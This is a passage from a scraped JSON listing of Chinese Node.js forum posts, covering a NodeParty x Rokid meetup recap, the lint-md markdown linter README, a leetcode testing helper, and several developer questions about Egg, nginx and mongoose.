Rokid公司如期举行。虽然是下雪天，但各位程序猿大大对 Node.js 的热情不减，准时赴约。</p>\n<p><img src=\"//static.cnodejs.org/FqtQHi6geIW9M_ubesf_tBUXd_kZ\" alt=\"1.jpg\"></p>\n<p>整场分享持续 6 个小时，共有 7 位讲师为我们带来精彩的演讲。其中有现场写代码开飞机的，还有持续整整 3 小时的火爆话题，这辈子可能见不到第二次了……除了来到现场的观众，还有一大波  Node.js 爱好者观看了我们在 B 站的直播，为讲师打 call！</p>\n<p>第八期活动已经圆满结束了，但开发者社区的学习和分享精神仍在继续。就让我们再次回顾一下本次的演讲主题，希望大家有所收获。一起发展 Node.js 生态。</p>\n<h3>Mesh: 来一起用 JavaScript 开发无人机应用</h3>\n<p><img src=\"//static.cnodejs.org/FpLW7cYfB1NqvJEx6Pa_Kb62sCdP\" alt=\"2.jpg\"></p>\n<p><strong>主讲人介绍</strong></p>\n<p>刘哲轩，一个程序员。本科就读于威斯康星大学麦迪逊校区，硕士就读于佐治亚理工，毕业后在微软总部薅了几年资本主义的羊毛，现在广州奇志科技做开发。大学时期开始钻研前后端技术，强迫症癌晚期，吉他爱好者，仍在拓展能力和拓宽视野的路上上下求索。</p>\n<p><strong>内容</strong></p>\n<p>Mesh 的背景介绍、在 Mesh 里用 JS 能做什么、内核介绍以及从无人机应用出发, 连通更多的设备和服务。</p>\n<blockquote>\n<p>一句话总结：一款可以控制无人机的移动端控制框架。</p>\n</blockquote>\n<h3>一个应该了解的 ORM 库</h3>\n<p><img src=\"//static.cnodejs.org/Fg8wzj0wqmI8nJVOkiz-hNGWgNhx\" alt=\"3.jpg\"></p>\n<p><strong>主讲人介绍</strong></p>\n<p>李桑，学业半途而废，早年混迹夜场，在酒吧调酒，后跑去深圳这个年轻的城市搞 Java 后端，莫名其妙的又搞起了前端，从一个野路子到爱上 coding，目前在前端累计了大量的 web 开发经验，Java 搞丢了不想 Node.js 也溜走。</p>\n<p><strong>内容</strong></p>\n<ul>\n<li>Sequelize 介绍</li>\n<li>Sequelize 工作原理和 API 介绍</li>\n<li>在实际系统中的应用场景</li>\n<li>对 ORM 库的一些思考</li>\n</ul>\n<blockquote>\n<p>一句话总结：前端工程师如何像后端拓展的心路历程。</p>\n</blockquote>\n<h3>如何基于 Egg/React 设计企业级的前后端 Framewor</h3>\n<p><img src=\"//static.cnodejs.org/FkGwekjvlj92r94_4WFIyGHTRq64\" alt=\"4.jpg\"></p>\n<p><strong>主讲人介绍</strong></p>\n<p>陈锦辉，宋小菜前端架构师，早年搞 Java 后端，后转 Android/iOS 原生应用，直到遇到 Node/ReactNative，彻底投入大前端怀抱，目前专注前端（App/PC Web/微信生态链）的跨端工程运维体系搭建，以及跨前后端团队的数据聚合服务层架构，痴迷追根溯源，乐于探索布道新技术。张伟林，宋小菜资深前端开发工程师，94 年 Coding Boy，霹雳迷，已手残的纸牌魔术师，喜欢神奇的东西，技术栈从上向下不断横向纵向贯穿，目前在寻找前后端大一统思想的路上越走越偏。</p>\n<p>张伟林，宋小菜资深前端开发工程师，94 年 Coding Boy，霹雳迷，已手残的纸牌魔术师，喜欢神奇的东西，技术栈从上向下不断横向纵向贯穿，目前在寻找前后端大一统思想的路上越走越偏。</p>\n<p><strong>内容</strong></p>\n<ul>\n<li>宋小菜的业务背景介绍；</li>\n<li>引出效率基建对于长链路 B2B 的重要性；</li>\n<li>宋小菜的技术栈介绍；</li>\n<li>从技术栈规划和演进引出团队前后端框架统一的必要性；</li>\n<li>前端框架 Highway 的设计理念与资源发布；</li>\n<li>从前端框架设计引出构建部署全家桶之后与后端框架对接/打通的重要性；</li>\n<li>Egg 框架的特点以及小菜的技术演进选型；</li>\n<li>Thinkjs/Express/Koa/Egg 几个框架的特点与我们的取舍；</li>\n<li>后端框架 Cross 的设计理念与规划；</li>\n<li>基于 Egg 做企业框架封装（考虑 GraphQL/RPC）和可能会遇到的问题；</li>\n</ul>\n<h3>N-API: 下一代 Node.js Native Module API</h3>\n<p><img src=\"//static.cnodejs.org/Fp73MPI4f_88R_C-F6Y6shETGFno\" alt=\"5.jpg\"></p>\n<p><strong>主讲人介绍</strong></p>\n<p>吞吞/<a href=\"/user/legendecas\">@legendecas</a>/ShadowNode Member/YodaOS TSC Member/语言爱好者/喜欢猫/不救公主只顾瞎逛炸鱼/Coder/Rokid工程狮。</p>\n<p><strong>内容</strong></p>\n<ul>\n<li>N-API 介绍</li>\n<li>单次编译即可兼容不同版本 Node.js Runtime</li>\n<li>从 NAN 到 N-API</li>\n<li>N-API 的实际应用</li>\n</ul>\n<blockquote>\n<p>一句话总结：听完感兴趣的话就可以去读《Node.js 来一打 C++ 拓展》了。</p>\n</blockquote>\n<h3>Jarvis——前后端对接解决方案</h3>\n<p><img src=\"//static.cnodejs.org/FhYFPpuzbzltR0DoeWv7o1PZdnn2\" alt=\"6.jpg\"></p>\n<p><strong>主讲人介绍</strong></p>\n<p>陈传滨，一个热爱健身的前端，创业时期搞过 Java 后端，iOS 原生应用。现在专注于前端研发，喜欢制作自动化工具来提高工作效率，将单调的事情变得有意思。</p>\n<p><strong>内容</strong></p>\n<ul>\n<li>Jarvis 介绍</li>\n<li>遇到的问题Jarvis</li>\n<li>解决方案</li>\n<li>Jarvis 实际应用</li>\n</ul>\n<blockquote>\n<p>一句话总结：一款面向数据 API 的 Web SDK 生成工具。</p>\n</blockquote>\n<h3>关于 class field 的神秘话题</h3>\n<p><img src=\"//static.cnodejs.org/FnbNPTkdglNEXJGF54cVEIguHXVX\" alt=\"7.jpg\"></p>\n<p><strong>主讲人介绍</strong></p>\n<p>贺师俊，网名 <a href=\"/user/hax\">@hax</a>，现就职于百姓网架构部；十多年来一直活跃在 Web 标准、前端开发和 JavaScript 社区，对 HTML 标准有微小的贡献。精通 JavaScript，早在 ES4 时代就通过 es-discuss 邮件列表参与标准讨论并提交 issue，近年来则通过 GitHub 关注了几乎所有 ECMAScript 新草案的进展和讨论。尤其是最近富有争议的 optional chaining 和 class fields 提案，深度参与了讨论。Hax 给 Babel、ESLint、Webpack 等多个 JavaScript 生态中的重要项目提交过 issue 和 pull request，写过多个针对 ES 新特性的 Babel 转换插件，并是 Atom 编辑器 js-refactor 插件的维护者。Hax 做过大量 JavaScript 相关的分享，包括题为「JavaScript — The World’s Best Programming Language」的演讲。</p>\n<p><strong>内容</strong></p>\n<p>早在去年7月，tc39 已经批准 class field 提案到达 Stage 3，但浏览器厂商一直没有实现该提案，Babel 也只实现了 public field 而没有实现 private field。其中一个原因也许是因为争议性的 “#priv” 语法。最近，Babel 7 和 Chrome 终于实现了该提案，但是争议并没有因此停止。自从 ES Harmony 以来，我们还是第一次见到如此激烈的分歧。作为中国 JS 社区的活跃分子，我通常都是向大家介绍 JS 新特性如何能更好的帮助我们开发者；我很不情愿将提案讨论中的争议性内容作为话题呈现给开发者，因为这对我们开发者来说没有什么意义，也并不能帮助 tc39 解决争议，还影响“和谐”。但是作为本次争议提案的反对者之一，我认为形势已经非常严峻 —— 这份提案已经接近 Stage 4，也就是正式标准；同时 tc39 最近的会议也已经拒绝所有的竞争提案，并决议停止寻求其他替代性方案；引擎厂商也即将实现和默认开启该特性。当使用该新特性的代码进入 production 环境，就意味着再也没有回头路。它很可能会成为 JS 永远无法摆脱的新的 “Bad Part”。而且本提案涉及语言的核心设施之一 class，影响烈度并非其他局部特性可比，我认为可能影响整个 JavaScript 生态。因此，我不得不将这场争议呈现给社区。</p>\n<p>无论是寻求更广泛的社区反馈以提交给 tc39 和引擎厂商，还是说在最坏的情况下，让开发者做好准备;至少我已经尽力了；注意，在本次分享中，我会尽量保持客观，但作为提案的反对者，我不可能以全然中立立场叙述争议双方的观点，并且本次分享将涉及许多 JS 语法语义中的细节问题和一些对普通开发者来说相当陌生的概念。本次分享对于大家很可能将是一场痛苦的旅行。You have been warned!</p>\n<blockquote>\n<p>一句话总结：<a href=\"https://github.com/tc39/proposal-class-fields/issues\">https://github.com/tc39/proposal-class-fields/issues</a></p>\n</blockquote>\n<p>现场精彩照片：</p>\n<p><img src=\"//static.cnodejs.org/FkoRnjXMjoFtyPhrKktCnadGjW1S\" alt=\"a1.jpg\">\n<img src=\"//static.cnodejs.org/FnskJlHQqPL17V3MTQiryQnUhOYL\" alt=\"a2.jpg\">\n<img src=\"//static.cnodejs.org/FnIBojdUtBT5LD-IFQePHezo2cTE\" alt=\"a3.jpg\">\n<img src=\"//static.cnodejs.org/FgtR2Kbh92mnUHDGhIrbPEiS1et9\" alt=\"a4.jpg\">\n<img src=\"//static.cnodejs.org/Ftgfot8XMHZXsFO2BATsaIXvp-jj\" alt=\"a5.jpg\">\n<img src=\"//static.cnodejs.org/Ft2KLkloZdLyJy2m-oQE8C0P2aPk\" alt=\"a6.jpg\"></p>\n<p>讲师和观众的大合照</p>\n<p>咱们下期见！</p>\n<p>第八期杭州 NodeParty ✖️ Rokid 技术分享会延展资料：</p>\n<ul>\n<li><a href=\"http://link.zhihu.com/?target=https%3A//github.com/yorkie/Node-Party/tree/master/2018-12-09%23%25E7%25AC%25AC%25E5%2585%25AB%25E6%259C%259F%25E6%259D%25AD%25E5%25B7%259E-nodeparty-%25E5%259B%259E%25E9%25A1%25BE\">讲师PPT下载地址</a></li>\n<li>讲师视频观看地址：\n<ul>\n<li><a href=\"http://link.zhihu.com/?target=http%3A//space.bilibili.com/314358436/channel/detail%3Fcid%3D58252\">B 站</a></li>\n<li><a href=\"http://link.zhihu.com/?target=https%3A//www.youtube.com/channel/UCRvBWIaBcsfvCTC_4EKW4lw%3Fview_as%3Dsubscriber\">YouTube</a></li>\n</ul>\n</li>\n</ul>\n<p>杭州 NodeParty 是由大搜车（Souche Inc.）发起的一个面向 Node.js 爱好者的技术分享聚会，希望能够构建一个持续的分享学习的平台，一起发展 Node.js 生态。</p>\n<p>Rokid 是一家专注人机交互技术和人工智能软硬件产品开发的科技创新型企业。Rokid 推出首个开源 AI OS—<a href=\"https://github.com/Rokid/YodaOS\">YodaOS</a>，兼容 Node.js 和 N-API，拥抱 Web 标准，为 Node.js 和前端赋予智能设备上的 AI 能力。YodaOS 以社区推动演进，坚持开放精神。Rokid 希望跟大家一起玩 YodaOS，一起，让每个人享受科技！</p>\n</div>","title":"NodeParty x Rokid 第八期活动回顾","last_reply_at":"2018-12-13T11:29:12.560Z","good":false,"top":false,"reply_count":3,"visit_count":626,"create_at":"2018-12-13T08:26:58.479Z","author":{"loginname":"yorkie","avatar_url":"https://avatars3.githubusercontent.com/u/1935767?v=4&s=120"}},{"id":"5c1230957ec239239ff56946","author_id":"575531beefa4e8950e0a697b","tab":"share","content":"<div class=\"markdown-text\"><h1>lint-md</h1>\n<p>开源地址：<a href=\"https://github.com/hustcc/lint-md\">https://github.com/hustcc/lint-md</a></p>\n<blockquote>\n<p>用于检查中文 markdown 编写格式规范的命令行工具，基于 AST 开发，且方便集成 ci；同时提供 API 方法调用。Cli tool to lint your markdown file for Chinese.</p>\n</blockquote>\n<blockquote>\n<p>检查规则来源于 <a href=\"https://github.com/ruanyf/document-style-guide\">chinese-document-style-guide</a>.</p>\n</blockquote>\n<p><a href=\"https://travis-ci.org/hustcc/lint-md\"><img src=\"https://travis-ci.org/hustcc/lint-md.svg?branch=master\" alt=\"Build Status\"></a>\n<a href=\"https://coveralls.io/github/hustcc/lint-md\"><img src=\"https://coveralls.io/repos/github/hustcc/lint-md/badge.svg?branch=master\" alt=\"Coverage Status\"></a>\n<a href=\"https://www.npmjs.com/package/lint-md\"><img src=\"https://img.shields.io/npm/v/lint-md.svg\" alt=\"npm\"></a>\n<a href=\"https://www.npmjs.com/package/lint-md\"><img src=\"https://img.shields.io/npm/dm/lint-md.svg\" alt=\"npm\"></a></p>\n<h2>安装</h2>\n<blockquote>\n<p><strong>npm i -g lint-md</strong></p>\n</blockquote>\n<h2>使用</h2>\n<pre class=\"prettyprint language-bash\"><code>Usage: &lt;lint-md&gt; &lt;files...&gt; [options]\n\nlint your markdown files\n\nOptions:\n  -v, --version                  output the version number\n  -c, --config [configure-file]  use the configure file, default .lintmdrc\n  -h, --help                     output usage information\n</code></pre><p>Example:</p>\n<pre class=\"prettyprint language-bash\"><code>lint-md README.md Document.md\n</code></pre><h2>检查类型</h2>\n<blockquote>\n<p>检查规则来源于 <a href=\"https://github.com/ruanyf/document-style-guide\">chinese-document-style-guide</a>.</p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th>规则</th>\n<th>详细描述</th>\n<th>解决办法</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>space-round-alphabet</td>\n<td>中文与英文之间需要增加空格</td>\n<td>对应提示的位置增加空格</td>\n</tr>\n<tr>\n<td>space-round-number</td>\n<td>中文与数字之间需要增加空格</td>\n<td>对应提示的位置增加空格</td>\n</tr>\n<tr>\n<td>no-empty-code-lang</td>\n<td>代码语言不能为空</td>\n<td>在代码块语法上增加语言</td>\n</tr>\n<tr>\n<td>no-empty-url</td>\n<td>链接和图片地址不能为空</td>\n<td>填写完整的 url，或者不使用链接和图片语法</td>\n</tr>\n<tr>\n<td>no-empty-list</td>\n<td>List 内容不能为空</td>\n<td>List 语法中，填写内容</td>\n</tr>\n<tr>\n<td>no-empty-code</td>\n<td>代码块内容不能为空</td>\n<td>删除空的代码块，或者填充代码内容</td>\n</tr>\n<tr>\n<td>no-empty-blockquote</td>\n<td>blockquote 内容不能为空</td>\n<td>删除空的 blockquote，或者填充内容</td>\n</tr>\n<tr>\n<td>no-special-characters</td>\n<td>文本中不能有特殊字符</td>\n<td>可能是复制出来的特殊字符，删除特殊字符即可</td>\n</tr>\n<tr>\n<td>use-standard-ellipsis</td>\n<td>使用标准规范的省略号</td>\n<td>使用标准规范的省略号‘……’ / ‘…’</td>\n</tr>\n<tr>\n<td>no-fullwidth-number</td>\n<td>不能用全角数字</td>\n<td>注意输入法切换为半角输入</td>\n</tr>\n<tr>\n<td>no-space-in-emphasis</td>\n<td>emphasis 内容前后不能有空格</td>\n<td>删除 emphasis 内容中的前后空格即可</td>\n</tr>\n<tr>\n<td>no-space-in-link</td>\n<td>link 内容前后不能有空格</td>\n<td>删除 link 内容中的前后空格即可</td>\n</tr>\n<tr>\n<td>no-multiple-space-blockquote</td>\n<td>blockquote 语法不能包含有多个空格</td>\n<td>删除 blockquote 内容中多余的空格</td>\n</tr>\n<tr>\n<td>no-trailing-punctuation</td>\n<td>标题不能以标点符号结尾</td>\n<td>删除标题最后的标点符号</td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p>目前仅仅检查了比较通用的类型，<strong>欢迎 pull request</strong>，在 <code>rules</code> 中增加自己的规则，开发约束：</p>\n</blockquote>\n<ul>\n<li>规则主要针对于中文 markdown 的编写规范</li>\n<li>使用类 babel plugin 的方式来进行规则检查，一个插件对应一个规则</li>\n<li>规则名称对应和插件文件名保持一致</li>\n<li>先提 issue 进行讨论</li>\n<li><a href=\"https://astexplorer.net/\">AST 工具</a>，使用其中的 markdown AST 辅助开发插件</li>\n</ul>\n<h2>配置</h2>\n<p>默认所有的规则都是 <code>error</code> 类型，但是可以通过配置来指定规则类型。示例 <code>.lintmdrc</code> ：</p>\n<pre class=\"prettyprint language-json\"><code>{\n  &quot;excludeFiles&quot;: [],\n  &quot;rules&quot;: {\n    &quot;no-empty-code&quot;: 1\n  }\n}\n</code></pre><p>通过 rules 来配置规则的等级。</p>\n<ul>\n<li><strong>0</strong>：ignore 忽略不检查该规则</li>\n<li><strong>1</strong>：warning 警告，但不阻断 ci</li>\n<li><strong>2</strong>：error 错误，且阻断 ci</li>\n</ul>\n<p>通过 excludeFiles 来忽略文件和目录，glob 语法。</p>\n<h2>ci 集成</h2>\n<ul>\n<li>Travis</li>\n</ul>\n<blockquote>\n<p>在 <code>.travis.yml</code> 文件中配置以下内容。</p>\n</blockquote>\n<pre class=\"prettyprint language-yml\"><code>language: node_js\nnode_js:\n  - &quot;10&quot;\nbefore_install:\n  - npm i -g lint-md\nscript: lint-md README.md\n</code></pre><ul>\n<li>lint-stage</li>\n</ul>\n<blockquote>\n<p>在 <code>package.json</code> 中增加以下配置。</p>\n</blockquote>\n<pre class=\"prettyprint language-json\"><code>&quot;lint-staged&quot;: {\n  &quot;src&#x2F;**&#x2F;*.{md,markdown}&quot;: [\n    &quot;lind-md&quot;\n  ]\n}\n</code></pre><h2>API 调用</h2>\n<pre class=\"prettyprint language-js\"><code>import { lint, version } from &#x27;lint-md&#x27;;\n\nconst errors = lint(markdown, rules);\n</code></pre><p>Then will get the <code>errors</code> of the markdown string.</p>\n<h2>License</h2>\n<p>MIT@<a href=\"https://github.com/hustcc\">hustcc</a>.</p>\n</div>","title":"中文 markdown 格式校验工具 - lint-md","last_reply_at":"2018-12-13T10:12:37.006Z","good":false,"top":false,"reply_count":0,"visit_count":579,"create_at":"2018-12-13T10:12:37.006Z","author":{"loginname":"hustcc","avatar_url":"https://avatars2.githubusercontent.com/u/7856674?v=4&s=120"}},{"id":"5c12265af3d48d2397c10df0","author_id":"5c1225c2f3d48d2397c10de7","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://jadedrip.github.io/vue/2018/12/13/simple-vue/\">https://jadedrip.github.io/vue/2018/12/13/simple-vue/</a></p>\n</div>","title":"用 webpack 单独编译 vue 组件","last_reply_at":"2018-12-13T09:28:58.759Z","good":false,"top":false,"reply_count":0,"visit_count":601,"create_at":"2018-12-13T09:28:58.759Z","author":{"loginname":"jadedrip","avatar_url":"https://avatars2.githubusercontent.com/u/2951787?v=4&s=120"}},{"id":"5c121ae3f3d48d2397c10d95","author_id":"5c10c50f7ec239239ff561c2","tab":"share","content":"<div class=\"markdown-text\"><p>刚才逛到了一个叫做 stackshare 的社区，感觉帖子质量挺高的</p>\n<p>里面可以看 top company 用的是什么技术栈\n<img src=\"//static.cnodejs.org/FkkWxLQRYo3N-CjxtyjVlQ30mj7_\" alt=\"image.png\"></p>\n<p>里面也有很多人分享自己最近的项目用了什么技术以及为什么\n<img src=\"//static.cnodejs.org/FmeXIEpV96DFt5QYFvgYEWcs6ezU\" alt=\"image.png\"></p>\n<p>可以去逛逛：<a href=\"https://mergeek.com?project_id=YQ695jAvoVWpEzOk\">StackShare</a></p>\n</div>","title":"发现了一个可以看到很多大公司技术栈的外国社区","last_reply_at":"2018-12-13T08:40:03.646Z","good":false,"top":false,"reply_count":0,"visit_count":790,"create_at":"2018-12-13T08:40:03.646Z","author":{"loginname":"Kilen","avatar_url":"https://avatars1.githubusercontent.com/u/2741628?v=4&s=120"}},{"id":"5c1122ca7ec239239ff5642a","author_id":"539dc067c3ee0b58202c7840","tab":"share","content":"<div class=\"markdown-text\"><h2>描述</h2>\n<p>最近在用es6解leetcode，当问题比较复杂时，有可能修正了新的错误，却影响了前面的流程。要用通用的测试工具，却又有杀鸡用牛刀的感觉，所以就写了个简单易用的leetcode开发测试工具，分享与大家。</p>\n<h2>工具安装</h2>\n<p>npm i leetcode_test</p>\n<h2>使用示例1 (问题010)</h2>\n<p>codes:</p>\n<pre class=\"prettyprint\"><code>let test = require(&#x27;leetcode_test&#x27;).test\n&#x2F;**\n * @param {string} s\n * @param {string} p\n * @return {boolean}\n *&#x2F;\nvar isMatch = function (s, p) {\n    if (p.length === 0) {\n        return s.length === 0\n    }\n    firstMath = s.length &gt; 0 &amp;&amp; \n                (p[0] === s[0] ||\n                p[0] === &#x27;.&#x27;)\n    if (p.length &gt;= 2 &amp;&amp; p[1] === &#x27;*&#x27;) {\n        &#x2F;&#x2F;下面两部分的顺序不能交换\n        return firstMath &amp;&amp; isMatch(s.substring(1), p) || isMatch(s, p.substring(2))\n    } else {\n        return firstMath &amp;&amp; isMatch(s.substring(1), p.substring(1))\n    }\n};\nlet cases = [              &#x2F;&#x2F; [[[],&#x27;&#x27;],],   &#x2F;&#x2F;第一个参数是空数组\n    [[&#x27;abbabaaaaaaacaa&#x27;, &#x27;a*.*b.a.*c*b*a*c*&#x27;], true],\n    [[&#x27;aaa&#x27;, &#x27;a*ac&#x27;], true],                &#x2F;&#x2F;故意写错答案，展示测试失败输出效果\n    [[&#x27;a&#x27;, &#x27;..*&#x27;], true],\n]\ntest(isMatch, cases)\n</code></pre><blockquote>\n<p>测试用例编写说明</p>\n</blockquote>\n<p>leetcode要测试的都是函数，参数个数不定，但返回值是一个。因此，我设计用例的输入形式为一个用例就是一个两个元素的数组，第一个元素是一个数组：对应输入参数；第二个元素是一个值。\n上面例子的输入参数是（[2, 7, 11, 15], 91），第一个参数是数组，第二个参数是数值；返回值是一个数组（[0, 1]）。 如果要测试的函数的输入参数就是一个数组，要注意输入形式，比如，求[1,2,3,4]平均值，要这样输入测试用例： [[[1,2,3,4]],2.5]</p>\n<p>out:</p>\n<pre class=\"prettyprint\"><code>test [1] success, Input: (&#x27;abbabaaaaaaacaa&#x27;,&#x27;a*.*b.a.*c*b*a*c*&#x27;); Expected: true; Output: true\ntest [2] fail, Input: (&#x27;aaa&#x27;,&#x27;a*ac&#x27;); Expected: true; Output: false\ntest [3] success, Input: (&#x27;a&#x27;,&#x27;..*&#x27;); Expected: true; Output: true\nResult: test 3 cases, success: 2, fail: 1\nrunning 5 ms\n</code></pre><h2>使用示例2 (问题015)</h2>\n<p>codes:</p>\n<pre class=\"prettyprint\"><code>let test = require(&#x27;leetcode_test&#x27;).test\n&#x2F;**\n * @param {number[]} nums\n * @return {number[][]}\n *&#x2F;\nvar threeSum = function (nums) {\n    nums = nums.sort((a,b) =&gt; a - b);\n    const rs = [];\n    let i = 0;\n    while (i &lt; nums.length) {\n        let one = nums[i];\n        let two = i + 1;                    &#x2F;&#x2F;从队列头部开始\n        let three = nums.length - 1;        &#x2F;&#x2F;从队列尾部开始\n\n        while (two &lt; three) {\n            let sum = one + nums[two] + nums[three];\n            if (sum === 0) {\n                rs.push([one,nums[two],nums[three]]);\n                two++;\n                three--;\n                while (two &lt; three &amp;&amp; nums[two] === nums[two - 1]) {\n                    two++;\n                }\n                while (two &lt; three &amp;&amp; nums[three] === nums[three + 1]) {\n                    three--;\n                }\n            } else if (sum &gt; 0) three--;\n            else two++;\n        }\n        i++;\n        while (i &lt; nums.length &amp;&amp; nums[i] === nums[i - 1]) i++;\n    }\n    return rs;\n};\nlet cases = [               &#x2F;&#x2F; [[[],&#x27;&#x27;],],   &#x2F;&#x2F;第一个参数是空数组\n    [[[]],[]],\n    [[[1,-1,-1,0]],[-1,0,1]],\n    [[[-1,0,1,0]],[[-1,0,1]]],\n    [[[0,0,0,0]],[0,0,0]],\n    [[[-1,2,-1]],[-1,-1,2]],\n    [[[0,0,0]],[0,0,0]],\n    [[[-1,0,1,2,-1,-4]],[[-1,-1,2],[-1,0,1]]],            &#x2F;&#x2F;answer&#x27;s sequence is not important\n    [[[-1,0,1,2,-1,-4]],[[-1,0,1],[-1,-1,2]]],            &#x2F;&#x2F;answer&#x27;s sequence is not important\n    [[[-4,-2,-2,-2,0,1,2,2,2,3,3,4,4,6,6]],[[-4,-2,6],[-4,0,4],[-4,1,3],[-4,2,2],[-2,-2,4],[-2,0,2]]],\n    [[[-4,-2,1,-5,-4,-4,4,-2,0,4,0,-2,3,1,-5,0]],[[-5,1,4],[-4,0,4],[-4,1,3],[-2,-2,4],[-2,1,1],[0,0,0]]],\n]\ntest(threeSum,cases)\n</code></pre><blockquote>\n<p>测试用例编写说明</p>\n</blockquote>\n<p>测试用例的7与8，期待结果的数组元素顺序并不影响答案的判定。</p>\n<p>out:</p>\n<pre class=\"prettyprint\"><code>test [1] success, Input: ([]); Expected: []; Output: []\ntest [2] success, Input: ([-1,-1,0,1]); Expected: [-1,0,1]; Output: [[-1,0,1]]\ntest [3] success, Input: ([-1,0,0,1]); Expected: [[-1,0,1]]; Output: [[-1,0,1]]\ntest [4] success, Input: ([0,0,0,0]); Expected: [0,0,0]; Output: [[0,0,0]]\ntest [5] success, Input: ([-1,-1,2]); Expected: [-1,-1,2]; Output: [[-1,-1,2]]\ntest [6] success, Input: ([0,0,0]); Expected: [0,0,0]; Output: [[0,0,0]]\ntest [7] success, Input: ([-4,-1,-1,0,1,2]); Expected: [[-1,-1,2],[-1,0,1]]; Output: [[-1,-1,2],[-1,0,1]]\ntest [8] success, Input: ([-4,-1,-1,0,1,2]); Expected: [[-1,-1,2],[-1,0,1]]; Output: [[-1,-1,2],[-1,0,1]]\ntest [9] success, Input: ([-4,-2,-2,-2,0,1,2,2,2,3,3,4,4,6,6]); Expected: [[-2,-2,4],[-2,0,2],[-4,-2,6],[-4,0,4],[-4,1,3],[-4,2,2]]; Output: [[-2,-2,4],[-2,0,2],[-4,-2,6],[-4,0,4],[-4,1,3],[-4,2,2]]\ntest [10] success, Input: ([-5,-5,-4,-4,-4,-2,-2,-2,0,0,0,1,1,3,4,4]); Expected: [[-2,-2,4],[-2,1,1],[-4,0,4],[-4,1,3],[-5,1,4],[0,0,0]]; Output: [[-2,-2,4],[-2,1,1],[-4,0,4],[-4,1,3],[-5,1,4],[0,0,0]]\nResult: test 10 cases, success: 10, fail: 0\n</code></pre><h2>项目地址</h2>\n<p>工具地址：<a href=\"https://github.com/zhoutk/leetcode_test\">https://github.com/zhoutk/leetcode_test</a>\n解答地址：<a href=\"https://github.com/zhoutk/leetcode\">https://github.com/zhoutk/leetcode</a></p>\n<p>最近一直在用，已经把输出的样子调得还能看过眼了，答案对比算法，也改进了。遇到问题，我会持续改进，大家遇到问题也可提bug给我，我会尽快处理。</p>\n</div>","title":"简单易用的leetcode开发测试工具","last_reply_at":"2018-12-12T15:01:30.958Z","good":false,"top":false,"reply_count":0,"visit_count":666,"create_at":"2018-12-12T15:01:30.958Z","author":{"loginname":"zhoutk","avatar_url":"https://avatars2.githubusercontent.com/u/1542521?v=4&s=120"}},{"id":"5c09d539d3b8ab334e8dba8e","author_id":"5bb02cd39545eaf107b9c72e","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FmLiva0kExiKGWK6mrALNuljfolD\" alt=\"image.png\">\nafacode.top 现在只能访问首页, 在跳转别的就不信了\n<a href=\"https://github.com/afacodeafacode?tab=repositories\">https://github.com/afacodeafacode?tab=repositories</a></p>\n</div>","title":"nginx 可以代理自己的github吗, 怎么做","last_reply_at":"2018-12-12T12:59:33.912Z","good":false,"top":false,"reply_count":10,"visit_count":1110,"create_at":"2018-12-07T02:04:41.338Z","author":{"loginname":"afacode","avatar_url":"https://avatars3.githubusercontent.com/u/24989232?v=4&s=120"}},{"id":"5c10fd5c7ec239239ff56393","author_id":"5c0cb636f3d48d2397c0f53a","tab":"share","content":"<div class=\"markdown-text\"><p>以前一个项目的简化版，准备重构逐渐完善一下。</p>\n<p>// {app_root}/config/config.default.js\nexports.mssql2webapi = {\nurlprefix: ‘/api/’,\napitable: {\nemr: {// api/emr/\ndb: {\nserver: ‘<a href=\"http://d.vy01.com\">d.vy01.com</a>’,\nuser: ‘sa’,\npassword: ‘test.123456’,\ndatabase: ‘db1’,\n},\napis: [{//http://127.0.0.1:7001/emr/getuser?usercode=2\nname: ‘getuser’,\nsql: ‘api_getuser’,\ntype: ‘pro’,\nresult:‘object’\n}, {//http://127.0.0.1:7001/emr/findusers\nname: ‘findusers’,\nsql: ‘select * from users where objectstatus&gt;0’,\ntype: ‘sql’,\nresult:‘array’\n}],\n},\nris: {\ndb: {},\napis: [],\n},\n},\n};\nsee config/config.default.js</p>\n<p><a href=\"https://github.com/shz8/egg-mssql2webapi\">https://github.com/shz8/egg-mssql2webapi</a></p>\n</div>","title":"一个把mssql的sql、pro转为webapi的eggjs插件","last_reply_at":"2018-12-12T12:21:48.894Z","good":false,"top":false,"reply_count":0,"visit_count":542,"create_at":"2018-12-12T12:21:48.894Z","author":{"loginname":"shz8","avatar_url":"https://avatars3.githubusercontent.com/u/8197445?v=4&s=120"}},{"id":"5c079ecb1c62d8334935125e","author_id":"5a71687bafa0a121784a9181","tab":"ask","content":"<div class=\"markdown-text\"><p>mongoose 中如何把 _id变成 id 呈现出来，我试过了虚拟值，别名这些，发现都是一起消失跟呈现的。</p>\n<p>我期望返回的是 id 而不是 _id，但 id 的值是 _id 的。</p>\n<p>谢谢！</p>\n</div>","title":"mongoose 中如何把 _id变成 id 呈现出来 （已解决）","last_reply_at":"2018-12-12T12:21:08.744Z","good":false,"top":false,"reply_count":5,"visit_count":1062,"create_at":"2018-12-05T09:47:55.364Z","author":{"loginname":"imruxin","avatar_url":"https://avatars3.githubusercontent.com/u/5736012?v=4&s=120"}},{"id":"5c10ef5d7ec239239ff5634e","author_id":"51d37c80d44cbfa304285441","tab":"ask","content":"<div class=\"markdown-text\"><p>基于 <a href=\"https://github.com/eggjs/egg-ant-design-pro\">egg-ant-design-pro</a> 实现上传图片裁剪的功能。\n问题是这样的，egg-ant-design-pro 的 proxy 比较简单的做一个get 的代理，其他一些复杂一点的需求基本实现不了。所以进行了一些小修改。</p>\n<p>但是在上传文件的时候遇到了问题。文件流传到上传服务器的时候就报错了。而且目测是整个进程也死了，需要重新<code>npm run dev</code>才可以。</p>\n<p>目前实现思路如下：</p>\n<p>前端 通过dva的 request 把上传的文件传到 proxy ，通过了 <code>const stream = await ctx.getFileStream()</code> 获取到流，然后再通过<code>formstream</code>内的 <code>stream('file', stream, filename, mimeType, size)</code> 方法把流挂上去。然后<code>proxyObj.stream = form</code>传回给 <code>const res = await this.ctx.curl(url, proxyObj);</code>。最后到上传的服务器项目，再通过 <code>const stream = await ctx.getFileStream()</code>获取流。</p>\n<p>具体代码如下。</p>\n<p>egg-ant-design-pro 的 proxy 是这样的。</p>\n<pre class=\"prettyprint\"><code>&#x27;use strict&#x27;;\n\nconst Controller = require(&#x27;egg&#x27;).Controller;\n\nclass HomeController extends Controller {\n  async index() {\n    await 